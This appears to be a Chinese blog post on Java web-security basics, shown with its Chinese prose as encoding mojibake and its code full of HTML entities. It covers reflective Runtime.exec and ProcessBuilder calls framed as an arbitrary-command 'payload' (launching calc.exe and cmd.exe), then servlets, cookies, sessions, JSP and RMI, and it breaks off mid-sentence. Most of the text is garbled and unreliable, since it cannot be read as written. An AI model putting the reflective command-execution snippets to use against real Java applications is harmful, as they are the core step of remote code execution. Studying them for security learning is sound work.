æˆ‘ä»¬åˆ°æºç é‡Œåˆ†æè¿™æ®µä»£ç  å¯è§ï¼Œå½“æˆ‘ä»¬å¯¹Runtimeç±»æ‰§è¡ŒgetRuntime()æ—¶ä¼šå¾—åˆ°ä¸€ä¸ªRuntimeå¯¹è±¡ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨æˆ‘ä»¬çš„execæ–¹æ³•äº†åŒæ—¶ï¼ŒRuntime() è¢«privateä¿®é¥°ç¬¦ä¿®é¥°äº†ï¼Œè¿™è¯´æ˜æˆ‘ä»¬æ— æ³•é€šè¿‡Runtime a = new Runtime()æ¥å®ç°ä¸€ä¸ªRuntimeçš„å¯¹è±¡ã€‚æ‰€ä»¥è¯´ï¼Œæˆ‘ä»¬æ­£å¸¸åœ°ä½¿ç”¨runtimeæ¥æ‰§è¡Œå‘½ä»¤åªèƒ½ä¾é ä»¥ä¸Šä»£ç ã€‚ é‚£ä¹ˆæˆ‘ä»¬è¦æ˜¯æƒ³è¦ä¾é åå°„æ¥å†™ä¸€ä¸ªRuntimeæ‰§è¡Œä»»æ„å‘½ä»¤çš„payloadï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•å†™å‘¢ï¼Ÿ å…ˆæ¥ä¸€ä¸ªé”™è¯¯ç¤ºèŒƒï¼Œå½“æˆ‘ä»¬ç”¨å¸¸è§„çš„æ€è·¯å»å®ç°æ—¶ã€‚æˆ‘ä»¬ç›´æ¥è°ƒç”¨Runtimeç±»é‡Œçš„execæ–¹æ³•ï¼Œç„¶åé€šè¿‡newInstanceæ¥å®ä¾‹åŒ–ä¸€ä¸ªRuntimeå¯¹è±¡ Class clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);Method method &#x3D; clazz.getMethod(&quot;exec&quot;, String.class);method.setAccessible(true);method.invoke(clazz.newInstance(),&quot;calc.exe&quot;); æœ€ç»ˆç»“æœåˆ™æ˜¯æŠ¥é”™ï¼šclass test cannot access a member of class java.lang.Runtime (in module java.base) with modifiers â€œprivateâ€çœ‹æ¥é€šè¿‡åå°„ä¹Ÿä¸èƒ½ç›´æ¥è°ƒç”¨execæ–¹æ³•ï¼Œæˆ–è€…è¯´ä¸èƒ½å®ä¾‹åŒ–Runtimeå¯¹è±¡ã€‚é‚£ä¹ˆæ­£ç¡®æ€è·¯è¯¥æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿåº”è¯¥æ˜¯å…ˆè°ƒç”¨getRuntimeè·å¾—Runtimeå¯¹è±¡ï¼Œç„¶åå†è°ƒç”¨execæ–¹æ³• Class clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);Method MgetRuntime &#x3D; clazz.getMethod(&quot;getRuntime&quot;);Object runtime &#x3D; MgetRuntime.invoke(clazz); &#x2F;&#x2F;å¯¹ç±»å¯¹è±¡ä½¿ç”¨getRuntime(),å…¶å®å°±ç›¸å½“äºRuntime.getRuntime()ã€‚è¿™ç§æ–¹å¼ä»…é™staticæ–¹æ³•Method Mexec &#x3D; clazz.getMethod(&quot;exec&quot;, String.class);Mexec.invoke(runtime,&quot;calc.exe&quot;); æœ€ç»ˆå¼¹å‡ºè®¡ç®—å™¨ã€‚ ProcessBuilderæ‰§è¡Œå‘½ä»¤çš„åå°„å®ç°é™¤äº†Runtimeä»¥å¤–ï¼Œè¿˜å¯ä»¥ç”¨ProcessBuilderç±»æ¥æ‰§è¡Œå‘½ä»¤ã€‚å®ƒçš„æ­£å¸¸æƒ…å†µä½¿ç”¨å¦‚ä¸‹. ProcessBuilder pb &#x3D; new ProcessBuilder(&quot;calc.exe&quot;);pb.start(); æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹ProcessBuilderçš„æ„é€ æ–¹æ³•ï¼Œå®ƒçš„æ„é€ æ–¹æ³•æœ‰å¾ˆå¤šä¸ªé‡è½½ï¼Œæˆ‘ä»¬åˆ†æä¸€ä¸ªå§ã€‚ å¯è§ï¼ŒProcessBuilderçš„æ„é€ æ–¹æ³•æŠŠä¼ å…¥å‚æ•°ä¿å­˜åˆ°äº†commandå±æ€§é‡Œï¼Œç„¶åcommadä¼šè¢«ä»¥ç³»ç»Ÿå‘½ä»¤è°ƒç”¨ï¼ˆè¿™éƒ¨åˆ†ä»£ç å°±ä¸è´´å‡ºæ¥äº†ï¼‰ã€‚ é‚£ä¹ˆä»¥åå°„çš„å½¢å¼è¯¥å¦‚ä½•å®ç°å‘¢ã€‚ Class clazz &#x3D; Class.forName(&quot;java.lang.ProcessBuilder&quot;); Method start &#x3D; clazz.getMethod(&quot;start&quot;); start.invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;cmd.exe&quot;))); ServletServletç”Ÿå‘½å‘¨æœŸ1.è°ƒç”¨init()æ–¹æ³•è¿›è¡Œåˆå§‹åŒ–init()æ–¹æ³•åœ¨ç¬¬ä¸€æ¬¡åˆ›å»ºservletæ—¶è¢«è°ƒç”¨ï¼Œç”¨äºè¿›è¡Œåˆå§‹åŒ–æ“ä½œã€‚ public void init() throws ServletException&#123;...code...&#125; 2.è°ƒç”¨service()æ–¹æ³•å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚webæœåŠ¡å™¨ï¼Œå³servletå®¹å™¨è°ƒç”¨service()æ–¹æ³•å¤„ç†æ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå¹¶è¿”å›å“åº”ã€‚åŒæ—¶æ ¹æ®å®¢æˆ·ç«¯è¯·æ±‚çš„ç±»å‹ï¼ˆGetï¼ŒPostï¼Œdeleteç­‰ï¼‰ï¼Œåšå‡ºä¸åŒçš„è¡Œä¸ºï¼Œè¿™äº›è¡Œä¸ºæ˜¯ç”±serviceæ–¹æ³•æŠ½è±¡å‡ºçš„å…¶ä»–æ–¹æ³•ï¼ˆdoGetï¼ŒdoPostç­‰ï¼‰ã€‚æ‰€ä»¥è¿™é‡Œè¯´çš„è°ƒç”¨service()æ–¹æ³•ä¹Ÿå°±æ˜¯ç­‰åŒäºè°ƒç”¨doGetï¼ŒdoPostç­‰æ–¹æ³•ã€‚ doPost,doDeleteç­‰æ–¹æ³•çš„å®šä¹‰å½¢åŒäºä¸‹public void doGet(HttpServletRequest request,HttpServletResponse response) throws ServletException,IOException&#123;...code...&#125; 3.è°ƒç”¨distroy()åœ¨Servleté”€æ¯å‰å®Œæˆæ¸…ç†æ´»åŠ¨distrtoy()å‡½æ•°åªè°ƒç”¨ä¸€æ¬¡ï¼Œåœ¨Servletè¢«é”€æ¯å‰å®Œæˆåå°çº¿ç¨‹åœæ­¢ï¼Œæ•°æ®åº“é“¾æ¥å…³é—­ç­‰ä¸€ç³»åˆ—æ¸…ç†å·¥ä½œã€‚ public void destroy() &#123; &#x2F;&#x2F; ç»ˆæ­¢åŒ–ä»£ç ...&#125; ç¼–å†™ä¸€ä¸ªç®€å•çš„Servletæˆ‘ä»¬å†™ä¸€ä¸ªç¨‹åºï¼Œç”¨æ¥æ§åˆ¶Getè¯·æ±‚çš„å“åº” import javax.servlet.*;import javax.servlet.annotation.WebServlet;import javax.servlet.http.*;import java.io.*;@WebServlet(&quot;&#x2F;a&quot;) &#x2F;&#x2F;ç”¨äºè®¾å®šè·¯ç”±public class test extends HttpServlet &#123; @Override public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; response.setContentType(&quot;text&#x2F;html&quot;); PrintWriter out &#x3D; response.getWriter(); out.println(&quot;&lt;h1&gt;&quot; + &quot;a&quot; + &quot;&lt;&#x2F;h1&gt;&quot;); &#125;&#125; è‡³äºéƒ¨ç½²æˆ‘æ˜¯å‚è€ƒçš„è¿™ä¸ªæ–‡ç« https://blog.csdn.net/gaoqingliang521/article/details/108677301æˆ‘çš„ç‰ˆæœ¬æ—¶idea 2020.2ï¼Œå¯èƒ½ä¼šæœ‰å‡ºå…¥ã€‚ å¤„ç†ä¼ å‚servletå¤„ç†ä¼ å‚ä¸»è¦æ˜¯é€šè¿‡doGetå’ŒdoPostæ–¹æ³•è¿›è¡Œçš„ã€‚æ¥æ”¶å‚æ•°å€¼ä¸»è¦æ˜¯é ä¸‹é¢çš„æ–¹æ³• getParameter()ï¼šæ‚¨å¯ä»¥è°ƒç”¨ request.getParameter() æ–¹æ³•æ¥è·å–è¡¨å•å‚æ•°çš„å€¼ã€‚ getParameterValues()ï¼šå¦‚æœå‚æ•°å‡ºç°ä¸€æ¬¡ä»¥ä¸Šï¼Œåˆ™è°ƒç”¨è¯¥æ–¹æ³•ï¼Œå¹¶è¿”å›å¤šä¸ªå€¼ï¼Œä¾‹å¦‚å¤é€‰æ¡†ã€‚ getParameterNames()ï¼šå¦‚æœæ‚¨æƒ³è¦å¾—åˆ°å½“å‰è¯·æ±‚ä¸­çš„æ‰€æœ‰å‚æ•°çš„å®Œæ•´åˆ—è¡¨ï¼Œåˆ™è°ƒç”¨è¯¥æ–¹æ³•ã€‚ æˆ‘ä»¬å†™ä¸ªdemoè¯•è¯• import javax.servlet.*;import javax.servlet.annotation.WebServlet;import javax.servlet.http.*;import java.io.*;@WebServlet(&quot;&#x2F;a&quot;)public class test extends HttpServlet &#123; @Override public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; response.setContentType(&quot;text&#x2F;html&quot;); PrintWriter out &#x3D; response.getWriter(); String name &#x3D; new String(request.getParameter(&quot;name&quot;)); out.println(&quot;your name is &quot;+name); &#125;&#125; è¿™ä¸ªdemoä¸»è¦ç”¨äºæ¥æ”¶getæ•°æ®ï¼Œå¹¶åšå‡ºä¸€äº›å¤„ç†è¿”å›.é‚£ä¹ˆå¦‚ä½•æ¥æ”¶POSTæ•°æ®å‘¢ï¼Ÿå’ŒdoGetå·®ä¸å¤š import javax.servlet.*;import javax.servlet.annotation.WebServlet;import javax.servlet.http.*;import java.io.*;@WebServlet(&quot;&#x2F;a&quot;)public class test extends HttpServlet &#123; public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; response.setContentType(&quot;text&#x2F;html&quot;); PrintWriter out &#x3D; response.getWriter(); String name &#x3D; new String(request.getParameter(&quot;name&quot;)); out.println(&quot;[Post]your name is &quot;+name); &#125;&#125;éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œçš„request.getParameter(&quot;name&quot;)ä¼šä¼˜å…ˆé€‰æ‹©åœ¨urlé‡Œçš„å‚æ•°ï¼Œè€Œä¸æ˜¯httpåŒ…ä½“çš„å‚æ•° cookie&amp;sessioncookiecookieçš„ä¸»è¦æ–¹æ³•å¦‚ä¸‹ åºå· æ–¹æ³• &amp; æè¿° 1 public void setDomain(String pattern) è¯¥æ–¹æ³•è®¾ç½® cookie é€‚ç”¨çš„åŸŸï¼Œä¾‹å¦‚ runoob.comã€‚ 2 public String getDomain() è¯¥æ–¹æ³•è·å– cookie é€‚ç”¨çš„åŸŸï¼Œä¾‹å¦‚ runoob.comã€‚ 3 public void setMaxAge(int expiry) è¯¥æ–¹æ³•è®¾ç½® cookie è¿‡æœŸçš„æ—¶é—´ï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰ã€‚å¦‚æœä¸è¿™æ ·è®¾ç½®ï¼Œcookie åªä¼šåœ¨å½“å‰ session ä¼šè¯ä¸­æŒç»­æœ‰æ•ˆã€‚ 4 public int getMaxAge() è¯¥æ–¹æ³•è¿”å› cookie çš„æœ€å¤§ç”Ÿå­˜å‘¨æœŸï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œ-1 è¡¨ç¤º cookie å°†æŒç»­ä¸‹å»ï¼Œç›´åˆ°æµè§ˆå™¨å…³é—­ã€‚ 5 public String getName() è¯¥æ–¹æ³•è¿”å› cookie çš„åç§°ã€‚åç§°åœ¨åˆ›å»ºåä¸èƒ½æ”¹å˜ã€‚ 6 public void setValue(String newValue) è¯¥æ–¹æ³•è®¾ç½®ä¸ cookie å…³è”çš„å€¼ã€‚ 7 public String getValue() è¯¥æ–¹æ³•è·å–ä¸ cookie å…³è”çš„å€¼ã€‚ 8 public void setPath(String uri) è¯¥æ–¹æ³•è®¾ç½® cookie é€‚ç”¨çš„è·¯å¾„ã€‚å¦‚æœæ‚¨ä¸æŒ‡å®šè·¯å¾„ï¼Œä¸å½“å‰é¡µé¢ç›¸åŒç›®å½•ä¸‹çš„ï¼ˆåŒ…æ‹¬å­ç›®å½•ä¸‹çš„ï¼‰æ‰€æœ‰ URL éƒ½ä¼šè¿”å› cookieã€‚ 9 public String getPath() è¯¥æ–¹æ³•è·å– cookie é€‚ç”¨çš„è·¯å¾„ã€‚ 10 public void setSecure(boolean flag) è¯¥æ–¹æ³•è®¾ç½®å¸ƒå°”å€¼ï¼Œè¡¨ç¤º cookie æ˜¯å¦åº”è¯¥åªåœ¨åŠ å¯†çš„ï¼ˆå³ SSLï¼‰è¿æ¥ä¸Šå‘é€ã€‚ 11 public void setComment(String purpose) è®¾ç½®cookieçš„æ³¨é‡Šã€‚è¯¥æ³¨é‡Šåœ¨æµè§ˆå™¨å‘ç”¨æˆ·å‘ˆç° cookie æ—¶éå¸¸æœ‰ç”¨ã€‚ 12 public String getComment() è·å– cookie çš„æ³¨é‡Šï¼Œå¦‚æœ cookie æ²¡æœ‰æ³¨é‡Šåˆ™è¿”å› nullã€‚ æˆ‘ä»¬é©¬ä¸Šå†™ä¸€ä¸ªdemoï¼Œè¿™ä¸ªdemoä¼šç”¨åˆ° response.addCookieç”¨äºåœ¨å“åº”å¤´é‡Œæ·»åŠ cookieï¼Œcookie.setMaxAge ç”¨äºè®¾ç½®cookieçš„æœ‰æ•ˆæœŸï¼Œrequest.getCookies ç”¨äºè·å–è¯·æ±‚é‡Œçš„cookieæ•°ç»„è¿™é‡Œçš„demoæœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªç”¨äºæ·»åŠ cookieï¼Œä¸€ä¸ªç”¨äºè¾“å‡ºcookie ç”¨äºæ·»åŠ cookieimport javax.servlet.*;import javax.servlet.annotation.WebServlet;import javax.servlet.http.*;import java.io.*;@WebServlet(&quot;&#x2F;a&quot;)public class test extends HttpServlet &#123; public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; Cookie name &#x3D; new Cookie(&quot;name&quot;, request.getParameter(&quot;name&quot;)); &#x2F;&#x2F; ä¸­æ–‡è½¬ç  name.setMaxAge(60*60*24); response.addCookie( name ); &#125;&#125;è¾“å‡ºcookieå€¼import javax.servlet.*;import javax.servlet.annotation.WebServlet;import javax.servlet.http.*;import java.io.*;@WebServlet(&quot;&#x2F;b&quot;)public class test2 extends HttpServlet &#123; public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; Cookie cookie &#x3D; null; Cookie[] cookies &#x3D; null; &#x2F;&#x2F; è·å–ä¸è¯¥åŸŸç›¸å…³çš„ Cookie çš„æ•°ç»„ cookies &#x3D; request.getCookies(); &#x2F;&#x2F; è®¾ç½®å“åº”å†…å®¹ç±»å‹ response.setContentType(&quot;text&#x2F;html;charset&#x3D;UTF-8&quot;); PrintWriter out &#x3D; response.getWriter(); for (int i &#x3D; 0; i &lt; cookies.length; i++)&#123; if((cookies[i].getName()).compareTo(&quot;name&quot;)&#x3D;&#x3D;0)&#123; out.println(&quot;your name is &quot;+cookies[i].getValue()); &#125; &#125; &#125;&#125; sessionservleæä¾›äº†ä¸€ç³»åˆ—sessionæ¥å£è¾…åŠ©è¿™ä¸ªæµç¨‹ 1 public Object getAttribute(String name) è¯¥æ–¹æ³•è¿”å›åœ¨è¯¥ session ä¼šè¯ä¸­å…·æœ‰æŒ‡å®šåç§°çš„å¯¹è±¡ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šåç§°çš„å¯¹è±¡ï¼Œåˆ™è¿”å› nullã€‚ 2 public Enumeration getAttributeNames() è¯¥æ–¹æ³•è¿”å› String å¯¹è±¡çš„æšä¸¾ï¼ŒString å¯¹è±¡åŒ…å«æ‰€æœ‰ç»‘å®šåˆ°è¯¥ session ä¼šè¯çš„å¯¹è±¡çš„åç§°ã€‚ 3 public long getCreationTime() è¯¥æ–¹æ³•è¿”å›è¯¥ session ä¼šè¯è¢«åˆ›å»ºçš„æ—¶é—´ï¼Œè‡ªæ ¼æ—å°¼æ²»æ ‡å‡†æ—¶é—´ 1970 å¹´ 1 æœˆ 1 æ—¥åˆå¤œç®—èµ·ï¼Œä»¥æ¯«ç§’ä¸ºå•ä½ã€‚ 4 public String getId() è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ªåŒ…å«åˆ†é…ç»™è¯¥ session ä¼šè¯çš„å”¯ä¸€æ ‡è¯†ç¬¦çš„å­—ç¬¦ä¸²ã€‚ 5 public long getLastAccessedTime() è¯¥æ–¹æ³•è¿”å›å®¢æˆ·ç«¯æœ€åä¸€æ¬¡å‘é€ä¸è¯¥ session ä¼šè¯ç›¸å…³çš„è¯·æ±‚çš„æ—¶é—´è‡ªæ ¼æ—å°¼æ²»æ ‡å‡†æ—¶é—´ 1970 å¹´ 1 æœˆ 1 æ—¥åˆå¤œç®—èµ·ï¼Œä»¥æ¯«ç§’ä¸ºå•ä½ã€‚ 6 public int getMaxInactiveInterval() è¯¥æ–¹æ³•è¿”å› Servlet å®¹å™¨åœ¨å®¢æˆ·ç«¯è®¿é—®æ—¶ä¿æŒ session ä¼šè¯æ‰“å¼€çš„æœ€å¤§æ—¶é—´é—´éš”ï¼Œä»¥ç§’ä¸ºå•ä½ã€‚ 7 public void invalidate() è¯¥æ–¹æ³•æŒ‡ç¤ºè¯¥ session ä¼šè¯æ— æ•ˆï¼Œå¹¶è§£é™¤ç»‘å®šåˆ°å®ƒä¸Šé¢çš„ä»»ä½•å¯¹è±¡ã€‚ 8 public boolean isNew() å¦‚æœå®¢æˆ·ç«¯è¿˜ä¸çŸ¥é“è¯¥ session ä¼šè¯ï¼Œæˆ–è€…å¦‚æœå®¢æˆ·é€‰æ‹©ä¸å‚å…¥è¯¥ session ä¼šè¯ï¼Œåˆ™è¯¥æ–¹æ³•è¿”å› trueã€‚ 9 public void removeAttribute(String name) è¯¥æ–¹æ³•å°†ä»è¯¥ session ä¼šè¯ç§»é™¤æŒ‡å®šåç§°çš„å¯¹è±¡ã€‚ 10 public void setAttribute(String name, Object value) è¯¥æ–¹æ³•ä½¿ç”¨æŒ‡å®šçš„åç§°ç»‘å®šä¸€ä¸ªå¯¹è±¡åˆ°è¯¥ session ä¼šè¯ã€‚ 11 public void setMaxInactiveInterval(int interval) è¯¥æ–¹æ³•åœ¨ Servlet å®¹å™¨æŒ‡ç¤ºè¯¥ session ä¼šè¯æ— æ•ˆä¹‹å‰ï¼ŒæŒ‡å®šå®¢æˆ·ç«¯è¯·æ±‚ä¹‹é—´çš„æ—¶é—´ï¼Œä»¥ç§’ä¸ºå•ä½ã€‚ å†™ä¸ªdemoå§ï¼Œè¿‡ä¸€è¿‡å°±è¡Œäº† import javax.servlet.*;import javax.servlet.annotation.WebServlet;import javax.servlet.http.*;import java.io.*;import java.text.*;import java.util.*;@WebServlet(&quot;&#x2F;a&quot;)public class test extends HttpServlet &#123; public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; HttpSession session &#x3D; request.getSession(); &#x2F;&#x2F;åˆ›å»ºä¸€ä¸ªsessionå¯¹è±¡ Date createtime &#x3D; new Date(session.getCreationTime()); Date lastAccessTime &#x3D; new Date(session.getLastAccessedTime()); PrintWriter out &#x3D; response.getWriter(); SimpleDateFormat df &#x3D; new SimpleDateFormat(&quot;yyyy-MM-dd:mm:ss&quot;); String countkey &#x3D; new String(&quot;key&quot;); &#x2F;&#x2F;è®¿é—®æ¬¡æ•°çš„é”® Integer count &#x3D; Integer.valueOf(0); &#x2F;&#x2F;è®¿é—®æ¬¡æ•°çš„å€¼ String userID &#x3D; new String(&quot;Tom&quot;); &#x2F;&#x2F;ç”¨æˆ·IDçš„å€¼ String userIDKey &#x3D; new String(&quot;userIDKey&quot;); &#x2F;&#x2F;ç”¨æˆ·IDçš„é”® if(session.getAttribute(countkey)&#x3D;&#x3D;null)&#123; &#x2F;&#x2F;å¦‚æœè·å¾—è¯¥sessionçš„countkeyè¿™ä¸ªé”®çš„å€¼ä¸å­˜åœ¨æ—¶ï¼Œä¸ºå½“å‰sessionåˆå§‹åŒ–è¿™ä¸ªé”® session.setAttribute(countkey,Integer.valueOf(0)); &#125; if(session.isNew())&#123; &#x2F;&#x2F;å¦‚æœsessionæ˜¯ç¬¬ä¸€æ¬¡åˆ›å»ºï¼Œåˆ™ä¸ºå…¶åˆå§‹åŒ–userIDé”® session.setAttribute(userIDKey,userID); &#125; else&#123; count &#x3D; (Integer) session.getAttribute(countkey); count &#x3D; count+1; userID &#x3D; (String)session.getAttribute(userIDKey); &#125; session.setAttribute(countkey,count); out.println(&quot;hello&quot;+userID+&quot;\\nthis is the &quot;+count+&quot; to visit this website\\n&quot;); out.println(&quot;first time:&quot;+createtime+&quot;\\n this time:&quot;+lastAccessTime); &#125;&#125; JSPæ¦‚è§ˆJSPæ˜¯è„šæœ¬è¯­è¨€ï¼Œä¸PHPç­‰è¯­è¨€ç±»ä¼¼ã€‚JSPæœ¬è´¨å°±æ˜¯servletï¼Œå®ƒå­˜åœ¨çš„æ„ä¹‰å°±æ˜¯ç®€åŒ–servletå¤æ‚çš„ç¨‹åºè¿‡ç¨‹ JSPåŸºç¡€è¯­æ³•ä»£ç æ®µJSPå’ŒPHPç­‰å¯ä»¥åµŒå…¥åˆ°HTMLçš„è„šæœ¬è¯­è¨€ç±»ä¼¼ï¼Œéœ€è¦ç”¨ä¸€ä¸ªä»£ç æ®µåŒ…è£¹ä»£ç ã€‚å…¶æ ¼å¼å¦‚ä¸‹ &lt;% code %&gt; åŒæ—¶åœ¨ä»£ç æ®µä¸­è¿˜å­˜åœ¨ç€æŒ‡ä»¤æ ‡ç­¾:Page,include,taglibä»–ä»¬çš„å®šä¹‰å’Œä½œç”¨å¦‚ä¸‹ &lt;%@ page ...... %&gt; pageæŒ‡ä»¤ç”¨äºå®šä¹‰ç½‘é¡µçš„å„å±æ€§ï¼Œå¦‚&lt;%@ page import&#x3D;&quot;...&quot; %&gt; è¡¨ç¤ºè¦å¯¼å…¥å“ªäº›javaæ¨¡å—,&lt;%@ page language&#x3D;&quot;...&quot; %&gt;è¡¨ç¤ºJSPé¡µé¢æ‰€ç”¨çš„è¯­è¨€ï¼Œé»˜è®¤æ˜¯java&lt;%@ include file&#x3D;&quot;æ–‡ä»¶ç›¸å¯¹urlåœ°å€&quot; %&gt; è¡¨ç¤ºè¦åŒ…å«å“ªäº›å…¶ä»–æ–‡ä»¶ï¼Œå¯ä»¥åŒ…å«JSP,HTMLæˆ–txtç­‰æ–‡ä»¶&lt;%@ taglib ......%&gt; ä¸»è¦ç”¨äºç”¨æˆ·è‡ªå®šä¹‰æ ‡ç­¾ åŠ¨ä½œå…ƒç´ ä¸æŒ‡ä»¤å…ƒç´ æ¯”è¾ƒç›¸ä¼¼ï¼Œä½†ä¸åŒçš„æ˜¯åŠ¨ä½œå…ƒç´ å¯ä»¥åŠ¨æ€çš„æ’å…¥ï¼Œä¸åƒæŒ‡ä»¤å…ƒç´ ä¸€æ ·ä¸€å¼€å¤´å°±ä¼šè¢«æ‰§è¡Œã€‚ ä¹å¤§å¯¹è±¡JSPä¸­æœ‰ä¹å¤§å¯¹è±¡ç”¨äºå®ç°å„ç§æ“ä½œã€‚ è‡³äºrequestå’Œresponseï¼Œè¿™ä¿©ç”¨çš„æ˜¯æœ€å¤šçš„æ˜¯ä»–ä»¬ï¼Œoutå¯¹è±¡ä¸»è¦ç”¨äºåœ¨responseä¸­å†™å…¥è¾“å‡ºå†…å®¹ï¼Œ out.printlnæˆ–è€…out.printç”¨äºè¾“å‡ºå†…å®¹ï¼Œout.flushç”¨äºåˆ·æ–°è¾“å‡ºæµ,å…¶ä½™åœ¨æ–°æ‰‹é˜¶æ®µéƒ½ä¸å’‹ç”¨ã€‚ ä¼ å‚å¤„ç† getParameter(): ä½¿ç”¨ request.getParameter() æ–¹æ³•æ¥è·å–è¡¨å•å‚æ•°çš„å€¼ã€‚ getParameterValues(): è·å¾—å¦‚checkboxç±»ï¼ˆåå­—ç›¸åŒï¼Œä½†å€¼æœ‰å¤šä¸ªï¼‰çš„æ•°æ®ã€‚ æ¥æ”¶æ•°ç»„å˜é‡ ï¼Œå¦‚checkboxç±»å‹ **getParameterNames():**è¯¥æ–¹æ³•å¯ä»¥å–å¾—æ‰€æœ‰å˜é‡çš„åç§°ï¼Œè¯¥æ–¹æ³•è¿”å›ä¸€ä¸ª Enumerationã€‚ **getInputStream():**è°ƒç”¨æ­¤æ–¹æ³•æ¥è¯»å–æ¥è‡ªå®¢æˆ·ç«¯çš„äºŒè¿›åˆ¶æ•°æ®æµã€‚ &lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;test jsp&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;your name is &lt;%&#x3D;request.getParameter(&quot;name&quot;)%&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; cookie&amp;sessioncookieï¼Œsessionåœ¨JSPé‡Œçš„è®¾ç½®ä¸servletå¦‚å‡ºä¸€è¾™cookieå’Œsessionåœ¨jspçš„&lt;%%&gt;ä»£ç åŒºé‡Œè®¾ç½®ï¼Œè®¾ç½®æ–¹æ³•ä¸servletå¦‚å‡ºä¸€è¾™ï¼Œå› ä¸º&lt;%%&gt;ä»£ç åŒºé‡Œæœ¬èº«å°±æ˜¯è°ƒç”¨çš„javaä»£ç ï¼Œæ‰€ä»¥ä¸å†èµ˜è¿° RMIä½•ä¸ºRMIRMIï¼Œå³è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œå…è®¸è¿è¡Œåœ¨ä¸€ä¸ªJAVAè™šæ‹Ÿæœºè°ƒç”¨å¦ä¸€ä¸ªJAVAè™šæ‹Ÿæœºä¸Šçš„å¯¹è±¡çš„æ–¹æ³•. RMI:å®ç°ä¸€ä¸ªè¿œç¨‹æ¥å£RMIçš„è¿œç¨‹æ¥å£ç”¨äºå…¶ä»–javaè™šæ‹Ÿæœºè¿œç¨‹è°ƒç”¨è¯¥æ¥å£ä¸‹çš„å¯¹è±¡çš„æ–¹æ³•. å®šä¹‰ä¸€ä¸ªè¿œç¨‹æ¥å£import java.rmi.Remote; &#x2F;&#x2F;å¼•å…¥Remoteæ¥å£public interface IHello extends Remote&#123; &#x2F;&#x2F;å®ç°ä¸€ä¸ªRemoteæ¥å£ public String sayHello(String name) throws java.rmi.RemoteException;&#x2F;&#x2F;è‹¥æ˜¯Remoteæ¥å£é‡ŒæŸä¸ªæ–¹æ³•æŠ›å‡ºRemoteExceptionå¼‚å¸¸,å°±æ„å‘³ç€è¿™æ˜¯ä¸€ä¸ªå¯ä»¥è¢«è¿œç¨‹è°ƒç”¨çš„æ–¹æ³•,ä½†ç›®å‰è¿™ä¸ªæ–¹æ³•è¿˜æœªè¢«å…·ä½“å®ç°.&#125; è¿œç¨‹æ¥å£çš„å®ç°ç±»åˆšåˆšæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªRemoteæ¥å£,ä½†æ˜¯ä»–çš„æ–¹æ³•è¿˜æœªå…·ä½“å®ç°.æˆ‘ä»¬å°±æ¥å®ç°è¿œç¨‹æ¥å£çš„å®ç°ç±»å§ import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;public class HelloImpl extends UnicastRemoteObject implements IHello&#123; &#x2F;&#x2F;å®šä¹‰ä¸€ä¸ªè¿œç¨‹æ¥å£å®ç°ç±»,æ³¨æ„è¿™ä¸ªè¿œç¨‹å®ç°ç±»å¿…é¡»ç»§æ‰¿è‡ªUnicastRemoteObject,ä¸ç„¶æœåŠ¡ç«¯ä¸ä¼šå‘é€è¯¥ç±»çš„å¯¹è±¡çš„å­˜æ ¹(stub(ä¸‹æ–‡è®²)) protected HelloImpl throws RemoteException&#123;&#x2F;&#x2F;å¿…é¡»è¦æœ‰ä¸€ä¸ªæŠ›å‡ºRemoteExceptionå¼‚å¸¸çš„æ˜¾ç¤ºæ„é€ å‡½æ•° super(); &#125; public String sayHello(String name) throws RemoteException&#123; return &quot;Hello&quot;+name; &#x2F;&#x2F;å®šä¹‰å®ç°ç±»æ–¹æ³•çš„å…·ä½“ä»£ç  &#125;&#125; ä¸¤å°JVMé€šè®¯çš„ç¬¬ä¸€æ­¥:RMI Registryä½•ä¸ºRMI Registryå¯ä»¥ç†è§£ä¸ºéƒ¨ç½²åœ¨è¢«è¿œç¨‹è°ƒç”¨çš„JAVAè™šæ‹Ÿæœºä¸Šçš„ä¸€ä¸ªåº”ç”¨,ç”¨äºå°†stubç»‘å®šåˆ°RegistryæœåŠ¡çš„URLä¸Šã€‚ æœåŠ¡ç«¯ç»‘å®šstubåˆ°æŒ‡å®šurl java.rmi.Naming.rebind(&quot;rmi:&#x2F;&#x2F;localhost:1099&#x2F;hello&quot;, hello); &#x2F;&#x2F;å¦‚æ­¤å¤„å°±æ˜¯æŠŠhelloè¿™ä¸ªå¯¹è±¡ç»‘å®šåœ¨äº†rmi:&#x2F;&#x2F;localhost:1099&#x2F;helloè¿™ä¸ªURL éšåå®¢æˆ·ç«¯æƒ³è¦è¿œç¨‹è°ƒç”¨helloè¿™ä¸ªå¯¹è±¡çš„æ–¹æ³•æ—¶ï¼Œå°±éœ€ IHello hello &#x3D; (IHello) 